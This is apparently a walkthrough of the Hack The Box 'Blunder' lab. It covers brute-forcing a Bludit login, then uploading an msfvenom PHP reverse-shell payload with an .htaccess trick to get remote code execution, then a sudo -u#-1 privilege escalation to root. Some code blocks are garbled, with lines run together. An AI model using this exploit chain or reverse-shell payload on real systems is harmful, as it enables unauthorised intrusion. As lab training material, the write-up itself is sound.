# Blunderer

Do a **rustscan** to check for open ports:

```
rustscan -a 10.129.190.208 --ulimit 5000 -- -A
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*CPcYmxasKYOJAJasKyFmoQ.png" alt="" height="439" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*gn4Jf_75DpmZXd_owBWPNg.png" alt="" height="216" width="700"><figcaption></figcaption></figure>

Add blunder.htb to your /etc/hosts. Let’s run ffuf for directory busting:

```
ffuf -w '/usr/share/wordlists/dirb/big.txt' -u '
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Tw4BNNrwqCAhFAp9yJYCFA.png" alt="" height="190" width="700"><figcaption></figcaption></figure>

Let’s visit the website now:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*QOJo0qHsCnt48svwkcb7DA.png" alt="" height="327" width="700"><figcaption></figcaption></figure>

(The website wasn’t rendering properly and was very slow in the VIP+ server. I switched to VIP server and then tried opening, and it opened really fast and rendered correctly as well)

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*LJO0puUfAcXFmyhoeoRVrQ.png" alt="" height="326" width="700"><figcaption></figcaption></figure>

In the /admin directory, I found a login page:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*0DMCxyQMCLqPx4pYv-DhRw.png" alt="" height="325" width="700"><figcaption></figcaption></figure>

In the source code of the page, I found a version: **3.9.2**. I searched for vulnerabilites for it, and found [this](https://www.exploit-db.com/exploits/48942). I modified the exploit a little so that it uses a username and not a username wordlist, and added an **encoding=’latin-1'** parameter in the **open** function so that it does not throw an error while reading rockyou:

Next, I ran the exploit with the rockyou wordlist:

```
python3 exploit.py -l  -u admin -p /usr/share/wordlists/rockyou.txt
```

I let it run for a while, but found no valid passwords. I did a directory busting again but this time with some extensions:

```
ffuf -w '/usr/share/wordlists/dirb/common.txt' -u ' -e '.php,.txt,.html' -t 64
```

Interestingly, I found a **todo.txt**. Visiting that:

<figure><img src="https://miro.medium.com/v2/resize:fit:556/1*mT6_wmDgRQwaT-q-Qw7RRg.png" alt="" height="234" width="556"><figcaption></figcaption></figure>

Ok, so the username may be **fergus**. I ran the exploit again with username fergus:

```
python3 exploit.py -l  -u fergus -p /usr/share/wordlists/rockyou.txt
```

But again, no result.\
Now, I thought of creating a custom wordlist using **cewl** (you can install it using apt install):

```
cewl -w output.txt 
```

Then I ran the exploit again, but with this wordlist:

```
python3 exploit.py -l  -u fergus -p ./output.txt
```

And I got the password as: **RolandDeschain** !!\
I logged in to the portal:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*fc2sP3SuuXEAuZXHydJJgA.png" alt="" height="327" width="700"><figcaption></figcaption></figure>

I remembered I had found an authenticated exploit as well. I searched again and found [this exploit](https://www.exploit-db.com/exploits/48701). More about the vulnerability can be found here:

[Bludit v3.9.2 Code Execution Vulnerability in "Upload function" · Issue #1081 · bludit/bluditA Code Execution Vulnerability in Bludit v3.9.2 Hi, For CVE ID,so I open a new issue,sorry about that.And I think you…github.com](https://github.com/bludit/bludit/issues/1081?source=post\_page-----6da4dc8d35c4--------------------------------)[NVDModified This vulnerability has been modified since it was last analyzed by the NVD. It is awaiting reanalysis which…nvd.nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2019-16113?source=post\_page-----6da4dc8d35c4--------------------------------#vulnCurrentDescriptionTitle)

I created a PHP payload:

```
msfvenom -p php/reverse_php LHOST=10.10.14.3 LPORT=1234 -f raw -b '"' > evil.pngecho -e "<?php $(cat evil.png)" > evil.png
```

and a .htaccess file:

```
echo "RewriteEngine off" > .htaccessecho "AddType application/x-httpd-php .png" >> .htaccess
```

Next, I went to the New-Content page in the portal and clicked on Image, then intercepted the upload request of **evil.png** using Burp.\
I changed the destination of the uploaded image to **../../tmp/temp** by changing the **uuid**:

<figure><img src="https://miro.medium.com/v2/resize:fit:486/1*516KohQyR7x3-0t3giQlJg.png" alt="" height="163" width="486"><figcaption></figcaption></figure>

Then forwarded the request. Next, I intercepted the upload request of **.htaccess** using Burp. Uploading it gave me an error, that this file type is not supported. I changed the extension to .png and then intercepted the request in Burp.\
Here, I changed the file name to **.htaccess** again:

<figure><img src="https://miro.medium.com/v2/resize:fit:517/1*sdICdm3bw6np6GFldaAWew.png" alt="" height="138" width="517"><figcaption></figcaption></figure>

And forwarded the request. Then, I switched off burp and visited: [http://10.10.10.191/bl-content/tmp/temp/evil.png](http://10.10.10.191/bl-content/tmp/temp/evil.png), while a nc listener was setup.

<figure><img src="https://miro.medium.com/v2/resize:fit:624/1*27wJF7ib3KmQOmoAd8K6jg.png" alt="" height="185" width="624"><figcaption></figcaption></figure>

And I got a shell! Let’s stabilise it using [socat](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). Now, in the /ftp directory, we find a **note.txt**:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*imtWd8JwkXU3llYEn3oijw.png" alt="" height="195" width="700"><figcaption></figcaption></figure>

We also find a **gzip compressed** file named **config**. I downloaded that to my machine and then extracted it using (first rename the file and add a .gz extension):

```
gzip -d config.gz
```

Then we get another file named config, but this time, it is a **POSIX tar archive**. Extract it using:

```
tar -xvf config
```

Extracting that, we get an audio: **buzz.wav**\
I played the audio using VLC, but couldn’t hear anything. I applied some basic steganography on it, but didn’t find anything. Now, in the /home directory we see that there are two users: **shaun** and **hugo**. Let’s see if we can get any config files for them. I went into the /var/www directory, and grepped for first shaun then hugo:

```
grep -ir shaun *grep -ir hugo *
```

Now, grepping for shaun didn’t yield any results, but grepping for hugo did give me a file: **/var/www/bludit-3.10.0a/bl-content/databases/users.php**\
Inside that file:

<figure><img src="https://miro.medium.com/v2/resize:fit:667/1*FroDdt89-F9LuTJ7mgFYzw.png" alt="" height="416" width="667"><figcaption></figcaption></figure>

We have a password: **faca404fd5c0a31cf1897b823c695c85cffeb98d**\
I treid to crack it using [crackstation](https://crackstation.net/), and I got this password: **Password120**.\
Change to user hugo using:

```
su hugo
```

Get **user.txt** from **/home/hugo/user.txt**

Now, time for privilege escalation!\
I did a **sudo -l** and found this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*qHUqsejHw1kPvU1_mcqXsQ.png" alt="" height="140" width="700"><figcaption></figcaption></figure>

Ok, so we can run **/bin/bash** as all users except root. Let’s execute this as the user **shaun**:

```
sudo -u shaun /bin/bash
```

Now, I ran **id** command:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*VGtNkYnZuVeqY7GBnkb2gQ.png" alt="" height="41" width="700"><figcaption></figcaption></figure>

So, we are a member of the **lxd** group. See this article:

[Lxd Privilege EscalationIn this post we are going to describes how an account on the system that is a member of the lxd group is able to…www.hackingarticles.in](https://www.hackingarticles.in/lxd-privilege-escalation/?source=post\_page-----6da4dc8d35c4--------------------------------)

Clone this [repo](https://github.com/saghul/lxd-alpine-builder). Then build it using:

```
./build-alpine
```

Then transfer the **.tar.gz** file to the victim machine. Next, I ran this command:

```
lxc image import ./alpine-v3.14-x86_64-20210820_1918.tar.gz --alias myimage
```

But…

<figure><img src="https://miro.medium.com/v2/resize:fit:458/1*dnBPen4xXgPYuk8PthyuAA.png" alt="" height="145" width="458"><figcaption></figcaption></figure>

So, that’s a bummer.\
I ran linpeas and started checking for other ways to get root. In the end, I reverted back to hugo and googled the output of **sudo -l**, and got [this exploit](https://www.exploit-db.com/exploits/47502).\
I ran **sudo -V** and found that the sudo version on the machine is: **1.8.25p1** and the exploit says that sudo versions < 1.8.28 are affected. So, it should work here. I ran:

```
sudo -u#-1 /bin/bash
```

<figure><img src="https://miro.medium.com/v2/resize:fit:308/1*13AikPPbK4beRG6VBcCK7A.png" alt="" height="77" width="308"><figcaption></figcaption></figure>

And we are root!\
Get **root.txt** from **/root/root.txt**.

**We have successfully pwned the box!**
